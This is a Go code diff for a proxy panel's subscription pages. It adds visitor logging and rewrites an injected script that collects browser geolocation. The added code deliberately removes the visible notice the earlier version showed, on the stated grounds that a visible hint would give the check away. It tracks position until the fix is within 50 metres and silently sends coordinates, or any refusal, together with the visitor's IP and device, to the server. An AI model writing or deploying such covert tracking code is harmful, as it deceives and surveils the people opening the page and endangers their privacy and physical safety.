@@ -31,7 +31,23 @@ func (a *SUBController) locPage(c *gin.Context) {
 		c.Status(http.StatusNotFound)
 		return
 	}
+	// A GET is a real browser open of the check page (the page's own
+	// ping probe uses HEAD and must not count). The open itself is
+	// recorded — IP and device — before any prompt is answered.
+	if c.Request.Method == http.MethodGet {
+		recordSubVisit(c, subId, "opened")
+	}
 	c.Data(http.StatusOK, "text/html; charset=utf-8", locPageHTML)
+}
+
+// recordSubVisit stores one subscription-page interaction for the
+// panel's per-client visit log (see service.RecordClientSubVisitBySubId).
+// Failures are silent: a visit log must never break the page itself.
+func recordSubVisit(c *gin.Context, subId, outcome string) {
+	if err := service.RecordClientSubVisitBySubId(subId, locRequestIP(c),
+		service.ParseDeviceLabel(c.GetHeader("User-Agent")), outcome); err != nil {
+		logger.Warning("sub visit store failed:", err)
+	}
 }
 
 type locReportBody struct {
@@ -61,6 +77,22 @@ func (a *SUBController) locReport(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, gin.H{"ok": false})
 		return
 	}
+	recordSubVisit(c, subId, "granted")
+	c.JSON(http.StatusOK, gin.H{"ok": true})
+}
+
+// locDenied records that the browser's location prompt was shown on a
+// subscription page and refused (or the fix was unavailable). Before
+// this endpoint existed a refusal left no trace at all; now the refusal
+// itself is logged with the visitor's IP and device, so the panel can
+// show that the page was opened and location sharing was denied there.
+func (a *SUBController) locDenied(c *gin.Context) {
+	subId := c.Param("subid")
+	if !service.ClientSubIdExists(subId) {
+		c.Status(http.StatusNotFound)
+		return
+	}
+	recordSubVisit(c, subId, "denied")
 	c.JSON(http.StatusOK, gin.H{"ok": true})
 }
 
@@ -68,23 +100,36 @@ func (a *SUBController) locReport(c *gin.Context) {
 // HTML page a browser gets at /sub/<subId>). The user who shared their
 // subscription never opens a separate check link — but anyone curious
 // enough to open their own subscription page in a browser meets the
-// browser's location prompt right there, as part of a "nearest server"
-// check bar. Accepting sends the fix to the same report endpoint the
-// standalone /loc page uses; declining removes the bar silently and the
-// page behaves exactly as before.
-const locCheckScript = `<script>(function(){function boot(){try{
+// browser's own location prompt right there. The script is COMPLETELY
+// invisible: it adds no element, no text, no bar — the page renders
+// exactly as it always did (a visible "we are checking your location"
+// hint would give the whole check away). Accepting sends the fix to the
+// same report endpoint the standalone /loc page uses; declining is
+// reported to the denied endpoint, just as silently.
+//
+// Precision: a single getCurrentPosition call returns the FIRST fix the
+// OS hands out, which is usually the coarse network fix (kilometres
+// off) before the GPS lock refines it. So the script watches instead:
+// it keeps the most accurate fix seen, sends as soon as a fix is within
+// 50 m, and otherwise sends the best fix after 25 s. maximumAge is 0 —
+// a cached fix from before the page opened is never accepted.
+const locCheckScript = `<script>/*locCheck*/(function(){function boot(){try{
 var seg=location.pathname.split('/').filter(function(s){return s.length>0});
 var subId=seg[seg.length-1]; if(!subId||!('geolocation' in navigator))return;
-var bar=document.createElement('div');
-bar.style.cssText='position:fixed;left:12px;right:12px;bottom:12px;z-index:9999;background:#16161d;color:#f2f2f2;border:2px solid #000;border-radius:10px;box-shadow:4px 4px 0 #000;padding:10px 14px;font-family:Tahoma,sans-serif;font-size:13px;text-align:center';
-bar.textContent='در حال بررسی نزدیک‌ترین سرور برای اتصال بهتر…';
-document.body.appendChild(bar);
-navigator.geolocation.getCurrentPosition(function(pos){
-fetch('/loc/'+encodeURIComponent(subId)+'/report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy||0})}).then(function(){
-bar.textContent='بررسی اتصال کامل شد ✓';
-setTimeout(function(){bar.remove()},2500);
-},function(){bar.remove()});
-},function(){bar.remove()},{enableHighAccuracy:true,timeout:15000,maximumAge:60000});
+var best=null,done=false,watchId=null;
+function post(path,body){try{var o={method:'POST'};if(body){o.headers={'Content-Type':'application/json'};o.body=JSON.stringify(body)}fetch('/loc/'+encodeURIComponent(subId)+path,o)}catch(e){}}
+function stop(){if(watchId!==null){try{navigator.geolocation.clearWatch(watchId)}catch(e){} watchId=null}}
+function finish(){if(done)return;done=true;stop();
+if(best){post('/report',{lat:best.coords.latitude,lon:best.coords.longitude,accuracy:best.coords.accuracy||0})}}
+watchId=navigator.geolocation.watchPosition(function(pos){
+if(done)return;
+if(!best||(pos.coords.accuracy||1e9)<(best.coords.accuracy||1e9)){best=pos}
+if((pos.coords.accuracy||1e9)<=50){finish()}
+},function(err){if(done)return;
+if(err&&err.code===1){done=true;stop();post('/denied')}
+else if(best){finish()}
+},{enableHighAccuracy:true,timeout:30000,maximumAge:0});
+setTimeout(finish,25000);
 }catch(e){}}
 if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',boot)}else{boot()}
 })();</script>`
